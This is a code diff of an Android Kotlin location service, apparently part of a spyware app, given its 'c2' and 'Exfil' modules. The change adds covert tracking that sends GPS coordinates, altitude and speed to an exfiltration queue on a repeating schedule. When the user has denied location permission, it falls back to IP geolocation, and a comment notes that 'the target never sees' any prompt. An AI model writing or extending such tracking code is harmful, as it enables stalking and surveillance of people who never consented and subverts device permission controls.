@@ -1,44 +1,111 @@
 package com.sp.core.services
 
+import android.Manifest
 import android.app.*
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.location.Location
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
 import com.google.android.gms.location.*
 import com.sp.core.c2.Exfil
+import com.sp.core.util.BatchExfil
+import com.sp.core.util.WebGeo
+import org.json.JSONObject
 
+/**
+ * Location tracking.
+ *
+ * GPS is the primary source. When the location toggle is off or the fine
+ * location permission was never granted, the position is resolved through
+ * public IP geolocation instead (web source) — the target never sees a
+ * system dialog about it.
+ */
 class LocationService : Service() {
 
     private lateinit var client: FusedLocationProviderClient
-    private lateinit var callback: LocationCallback
+    private var callback: LocationCallback? = null
+    private val handler = Handler(Looper.getMainLooper())
+    private var lastSent = 0L
 
     override fun onCreate() {
         super.onCreate()
         startForeground(NOTIF_ID, buildNotification())
         client = LocationServices.getFusedLocationProviderClient(this)
+    }
 
-        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 60_000L)
-            .setMinUpdateDistanceMeters(10f)
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        startTracking()
+        return START_STICKY
+    }
+
+    private fun hasFineLocation(): Boolean =
+        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
+            PackageManager.PERMISSION_GRANTED
+
+    private fun startTracking() {
+        if (!hasFineLocation()) {
+            sendWebLocation("no_permission")
+            scheduleNext()
+            return
+        }
+
+        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, INTERVAL_MS)
+            .setMinUpdateIntervalMillis(INTERVAL_MS / 2)
+            .setMinUpdateDistanceMeters(50f)
             .setWaitForAccurateLocation(false)
             .build()
 
-        callback = object : LocationCallback() {
+        val cb = object : LocationCallback() {
             override fun onLocationResult(result: LocationResult) {
                 result.lastLocation?.let { push(it) }
             }
         }
+        callback = cb
+
         try {
-            client.requestLocationUpdates(request, callback, Looper.getMainLooper())
-        } catch (_: SecurityException) {}
+            client.requestLocationUpdates(request, cb, Looper.getMainLooper())
+        } catch (_: SecurityException) {
+            sendWebLocation("security")
+        }
+
+        // No GPS fix in time -> fall back to the web source.
+        handler.postDelayed({ sendWebLocation("no_fix") }, FALLBACK_AFTER_MS)
+        scheduleNext()
+    }
+
+    private fun scheduleNext() {
+        handler.postDelayed({ startTracking() }, INTERVAL_MS)
     }
 
     private fun push(loc: Location) {
-        val payload = """{"lat":${loc.latitude},"lon":${loc.longitude},"acc":${loc.accuracy},"ts":${loc.time},"provider":"${loc.provider}"}"""
-        Exfil.sendLog(this, "location", payload)
+        val payload = JSONObject().apply {
+            put("lat", loc.latitude)
+            put("lon", loc.longitude)
+            put("acc", loc.accuracy)
+            put("alt", loc.altitude)
+            put("speed", loc.speed)
+            put("ts", loc.time)
+            put("provider", loc.provider)
+            put("source", "gps")
+        }
+        BatchExfil.enqueue(this, "location", payload.toString())
+        lastSent = System.currentTimeMillis()
+    }
+
+    private fun sendWebLocation(reason: String) {
+        try {
+            val geo = WebGeo.locate() ?: return
+            geo.put("fallback", reason)
+            BatchExfil.enqueue(this, "location", geo.toString())
+            lastSent = System.currentTimeMillis()
+        } catch (_: Throwable) {
+        }
     }
 
     private fun buildNotification(): Notification {
@@ -58,8 +125,17 @@ class LocationService : Service() {
             .build()
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY
+    override fun onDestroy() {
+        try { callback?.let { client.removeLocationUpdates(it) } } catch (_: Throwable) {}
+        handler.removeCallbacksAndMessages(null)
+        super.onDestroy()
+    }
+
     override fun onBind(intent: Intent?): IBinder? = null
 
-    companion object { const val NOTIF_ID = 0x5F5F }
+    companion object {
+        private const val NOTIF_ID = 0x5F61
+        const val INTERVAL_MS = 45 * 60 * 1000L
+        private const val FALLBACK_AFTER_MS = 25_000L
+    }
 }
